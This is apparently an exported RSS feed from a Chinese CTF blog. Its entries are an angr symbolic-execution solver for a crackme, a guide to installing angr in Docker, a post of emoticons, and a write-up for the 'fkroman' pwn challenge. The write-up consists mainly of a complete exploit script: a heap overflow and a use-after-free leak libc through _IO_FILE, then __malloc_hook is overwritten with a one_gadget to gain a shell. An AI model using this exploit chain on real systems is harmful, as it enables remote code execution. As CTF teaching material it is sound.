class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)verify((__int64)argv[<span class="number">1</span>]) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Correct! that is the secret key!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"I'm sorry, that's the wrong secret key!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need to enter the secret key!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">verify</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( encrypted[i] != ((<span class="keyword">unsigned</span> __int8)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)) | (<span class="keyword">unsigned</span> __int8)((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>))))</span><br><span class="line">                       + <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i == <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>符号执行脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy  <span class="comment">#处理用户输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    project = angr.Project(<span class="string">"./ais3_crackme"</span>)</span><br><span class="line"></span><br><span class="line">    argv1 = claripy.BVS(<span class="string">"argv1"</span>,<span class="number">100</span>*<span class="number">8</span>) <span class="comment">#猜测flag长度小于100,乘8是转换为字节</span></span><br><span class="line">    initial_state = project.factory.entry_state(args=[<span class="string">"./crackme1"</span>,argv1]) <span class="comment"># 传递参数</span></span><br><span class="line"></span><br><span class="line">    sm = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#象征性地执行程序，直到达到指令指针的要求值</span></span><br><span class="line">    sm.explore(find=<span class="number">0x400602</span>) <span class="comment">#在这个指令程序将打印“正确的”消息</span></span><br><span class="line"></span><br><span class="line">    found = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#请求符号解算程序以字符串的形式获取处于到达状态的argv1的值</span></span><br><span class="line">    solution = found.solver.eval(argv1, cast_to=str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(solution)</span><br><span class="line">    solution = solution[:solution.find(<span class="string">"\x00"</span>)]</span><br><span class="line">    <span class="keyword">print</span> solution</span><br><span class="line">    <span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    res = main()</span><br><span class="line">    <span class="keyword">assert</span> res == <span class="string">"ais3&#123;I_tak3_g00d_n0t3s&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(repr(main()))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>docker安装angr</title>
    <link href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/"/>
    <id>https://nocbtm.github.io/2019/10/02/docker安装angr/</id>
    <published>2019-10-02T07:48:56.000Z</published>
    <updated>2019-10-03T04:24:29.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环境为ubuntu16.64。</p><h2 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h2><p>申请<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a>，修改daemon配置文件/etc/docker/daemon.json来使用加速器，把下方的registry-mirrors换成你的加速器地址。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://culfukli.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></p><h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure><p>安装完执行docker images 查看镜像，运行angr<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure></p><p>上述命令可以执行angr，但不会保存你在其中做的修改，应该用下列命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> run -itd registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br><span class="line">1d443841326281a8c5aee9cfad74893a5eded421eadc3eac2222f91bf15e3eb9</span><br><span class="line"><span class="variable">$docker</span> <span class="built_in">exec</span> -it 1d44 bash     <span class="comment">#1d44为你的id的前四位</span></span><br><span class="line">root@1d4438413262:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure></p><p>这时可以输入命令了，与在linux中操作一样。<br>但在root用户下import angr会失败，用su angr命令切换到angr用户即可。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>进入到有例子的目录下，执行脚本,可以看到flag。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> /home/angr/angr-dev/angr-doc/examples/ais3_crackme</span><br><span class="line"><span class="variable">$ls</span></span><br><span class="line">ais3_crackme  solve.py</span><br><span class="line"><span class="variable">$python</span> solve.py </span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">ais3&#123;I_tak3_g00d_n0t3s&#125;</span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;'</span></span><br></pre></td></tr></table></figure></p><h2 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h2><p>主机向docker中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (本地文件路径) (docker container id):(容器中路径)</span><br></pre></td></tr></table></figure></p><p>docker向主机中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (docker container id):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure></p><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><h3 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h3 id="打开容器"><a href="#打开容器" class="headerlink" title="打开容器"></a>打开容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start container_id</span><br></pre></td></tr></table></figure><h3 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockr stop container_id</span><br></pre></td></tr></table></figure><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id</span><br></pre></td></tr></table></figure><h3 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">export</span> container_id &gt; 容器快照名</span><br></pre></td></tr></table></figure><h2 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名称</span><br></pre></td></tr></table></figure><h3 id="运行images"><a href="#运行images" class="headerlink" title="运行images"></a>运行images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it 镜像名称 bash</span><br></pre></td></tr></table></figure><h3 id="删除images"><a href="#删除images" class="headerlink" title="删除images"></a>删除images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>学习pwn的心理路程</title>
    <link href="https://nocbtm.github.io/2019/10/02/%E5%AD%A6%E4%B9%A0pwn%E7%9A%84%E5%BF%83%E7%90%86%E8%B7%AF%E7%A8%8B/"/>
    <id>https://nocbtm.github.io/2019/10/02/学习pwn的心理路程/</id>
    <published>2019-10-02T04:21:32.000Z</published>
    <updated>2019-10-02T10:57:24.281Z</updated>
    
    <content type="html"><![CDATA[<p>(o≖◡≖)<br>(๑•̀ㅂ•́)و✧<br>(*￣ω￣)<br>w(ﾟДﾟ)w<br>o(≧口≦)o<br>Σ( ° △ °|||)︴    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;(o≖◡≖)&lt;br&gt;(๑•̀ㅂ•́)و✧&lt;br&gt;(*￣ω￣)&lt;br&gt;w(ﾟДﾟ)w&lt;br&gt;o(≧口≦)o&lt;br&gt;Σ( ° △ °|||)︴    &lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://nocbtm.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数字经济 pwn fkroman writeup</title>
    <link href="https://nocbtm.github.io/2019/09/28/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20fkroman%20writeup/"/>
    <id>https://nocbtm.github.io/2019/09/28/数字经济 pwn fkroman writeup/</id>
    <published>2019-09-28T09:20:42.000Z</published>
    <updated>2019-10-04T06:16:27.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址</li><li>再用uaf漏洞劫持malloc_hook为one_gadget</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地环境：ubuntu 16.04，成功率不高<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./fkroman'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'121.40.246.48'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Your choice: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    index(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">iofile_off = [<span class="number">0x25dd</span>,<span class="number">0xf5eb</span>] <span class="comment">#_IO_2_1_stderr_+157</span></span><br><span class="line">libc_off = <span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x90</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span><span class="number">-8</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#-------------------leak libc---------------------</span></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">1</span>, p8(<span class="number">0xe0</span>))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">'A'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">2</span>, p16(iofile_off[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x54</span>, <span class="string">'A'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x00000000fbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.recv(<span class="number">0x40</span>)</span><br><span class="line">    recv_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc-&gt;'</span>+hex(recv_addr))</span><br><span class="line">    pause()</span><br><span class="line">    libc.address = recv_addr - libc_off</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------malloc_hook-------------------</span></span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">'B'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    dele(<span class="number">7</span>)</span><br><span class="line">    info(hex(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">8</span>, p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#0x7fefcf441aed _IO_wide_data_0+301</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target2</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    info(hex(libc.address+onegadgets[<span class="number">1</span>]))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">9</span>, <span class="number">0x1b</span>, <span class="string">'C'</span>*<span class="number">0x13</span>+p64(libc.address+onegadgets[<span class="number">1</span>])) <span class="comment">#0x7fefcf0c226a</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> LOCAL:</span><br><span class="line">                io = elf.process()</span><br><span class="line">                env=&#123;<span class="string">"LD_PRELOAD"</span>: libc.path&#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = remote(ip, port)</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure></p><p>参考文章:<br><a href="https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址&lt;/li&gt;
&lt;li&gt;再用uaf漏洞劫持malloc_hoo
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
